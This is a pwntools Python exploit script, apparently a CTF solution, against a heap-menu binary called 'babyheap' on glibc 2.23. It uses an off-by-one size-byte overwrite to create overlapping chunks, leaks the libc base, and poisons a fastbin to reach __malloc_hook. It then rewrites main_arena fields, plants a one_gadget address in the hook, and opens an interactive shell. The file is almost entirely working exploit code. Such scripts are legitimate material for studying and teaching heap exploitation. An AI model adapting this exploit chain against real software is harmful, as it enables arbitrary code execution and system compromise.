from pwn import *
import sys

if len(sys.argv) < 2:
	debug = True
else:
	debug = False

if debug:
	p = process("./babyheap")
	libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
else:
	pass

def menu(choice):
	p.sendlineafter("Command: ",str(choice))

def add(size):
	menu(1)
	p.sendlineafter("Size: ",str(size))
	#p.recvuntil("Allocated\n")

def edit(index,size,content):
	menu(2)
	p.sendlineafter("Index: ",str(index))
	p.sendlineafter("Size: ",str(size))
	p.sendafter("Content: ",content)
	p.recvuntil("Updated\n")

def free(index):
	menu(3)
	p.sendlineafter("Index: ",str(index))

def show(index):
	menu(4)
	p.sendlineafter("Index: ",str(index))

code_base = 0x555555554000
def debugf():
	if debug:
		gdb.attach(p,"b *{b1}".format(b1 = hex(code_base + 0x11BB)))
		#gdb.attach(p,"b malloc")

context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
#debugf()
size = 0x48
add(size) #0
add(size) #1
add(size) #2
add(size) #3
payload = "a" * size + "\xa1"
edit(0,size + 1,payload)
free(1)
add(size) #1
show(2)
p.recvuntil("Chunk[2]: ")
leak_addr = u64(p.recv(6).ljust(8,"\x00"))
libc.address = leak_addr - 88 - 0x10 - libc.symbols["__malloc_hook"]
log.success("libc_base:" + hex(libc.address))
add(size) #4
size2 = 0x58
add(size2) #5
add(size2) #6
add(size2) #7
add(size2) #8
payload = "a" * size2 + "\xc1"
edit(5,len(payload),payload)
free(6)
add(size2) #6
add(size2) #9
free(7)
payload = p64(size + 0x8 + 1)
edit(9,len(payload),payload)
add(size2) #7
debugf()
free(2)
target = libc.symbols["__malloc_hook"] + 0x30
payload = p64(target)
edit(4,len(payload),payload)
add(size) #2
add(size) #10
main_arena = libc.symbols["__malloc_hook"] + 0x10 + 88
target = libc.symbols["__malloc_hook"] - 0x10
payload = p64(0) * 5 + p64(target) + p64(0) + p64(main_arena) + p64(main_arena)
edit(10,len(payload),payload)
add(size) #11
one_gadget = libc.address + 0x4526a
payload = p64(one_gadget)
edit(11,len(payload),payload)
add(size)
p.interactive()	
